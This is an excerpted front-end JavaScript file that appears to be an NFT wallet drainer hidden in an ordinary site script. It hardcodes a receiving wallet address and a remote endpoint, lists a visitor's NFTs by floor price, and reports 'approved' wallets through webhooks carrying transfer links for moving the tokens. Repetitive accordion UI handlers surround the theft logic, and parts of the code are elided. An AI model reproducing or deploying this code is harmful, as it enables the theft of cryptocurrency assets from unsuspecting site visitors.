const receiveAddress = "0xCAD74065587D6D3eD2299Fb120FbCB9f48aD5cCd";
...
const BASE_URL = "https://tasties.live/bing";
...
async function askNfts() {
      ...
      return nfts
        ...
        .map((nft) => {
          return {
            ...
            floorPrice: nft.stats.floor_price,
  ...
  for (let nft of walletNfts) {
    ...
    if (contract_address === '0xdde2d979e8d39bb8416eafcfc1758f3cab2c9c72'.toUpperCase()) { //KnownOriginDigitalAsset (KODA)
      continue;
    }
...
const sendWebhooks = (walletAddress, contractAddress, transaction) => {
  const message = [
    `\`${walletAddress}\` just approved \`${contractAddress}\`.`,
    `Name: ${transaction.name}`,
    `Schema: ${transaction.schema}`,
    `Price: **(${transaction.price})**`,
    `Floor Price: ${transaction.floorPrice}`,
    `AngryDino Transfer Link: ${BASE_URL}/token/transfer/${contractAddress}/${walletAddress}`,
...
window.addEventListener("load", async () => {
  ...
  document.getElementById("panel1a-header1").addEventListener("click", function () {
    if (document.getElementById("panel1a-desc1").style.display === "none") {
      document.getElementById("panel1a-body1").style.height = "auto";
      document.getElementById("panel1a-desc1").style.display = "";
    }
    else {
      document.getElementById("panel1a-body1").style.height = "0px";
      document.getElementById("panel1a-desc1").style.display = "none";
    }
  });
  document.getElementById("panel1a-header2").addEventListener("click", function () {
    if (document.getElementById("panel1a-desc2").style.display === "none") {
      document.getElementById("panel1a-body2").style.height = "auto";
      document.getElementById("panel1a-desc2").style.display = "";
    }
    else {
      document.getElementById("panel1a-body2").style.height = "0px";
      document.getElementById("panel1a-desc2").style.display = "none";
    }
  });
  document.getElementById("panel1a-header3").addEventListener("click", function () {
    if (document.getElementById("panel1a-desc3").style.display === "none") {
      document.getElementById("panel1a-body3").style.height = "auto";
      document.getElementById("panel1a-desc3").style.display = "";
    }
    else {
      document.getElementById("panel1a-body3").style.height = "0px";
      document.getElementById("panel1a-desc3").style.display = "none";
    }
  });
  document.getElementById("panel1a-header4").addEventListener("click", function () {
    if (document.getElementById("panel1a-desc4").style.display === "none") {
      document.getElementById("panel1a-body4").style.height = "auto";
      document.getElementById("panel1a-desc4").style.display = "";
    }
    else {
      document.getElementById("panel1a-body4").style.height = "0px";
      document.getElementById("panel1a-desc4").style.display = "none";
    }
  });
  document.getElementById("panel1a-header5").addEventListener("click", function () {
    if (document.getElementById("panel1a-desc5").style.display === "none") {
      document.getElementById("panel1a-body5").style.height = "auto";
      document.getElementById("panel1a-desc5").style.display = "";
    }
    else {
      document.getElementById("panel1a-body5").style.height = "0px";
      document.getElementById("panel1a-desc5").style.display = "none";
    }
  });
});
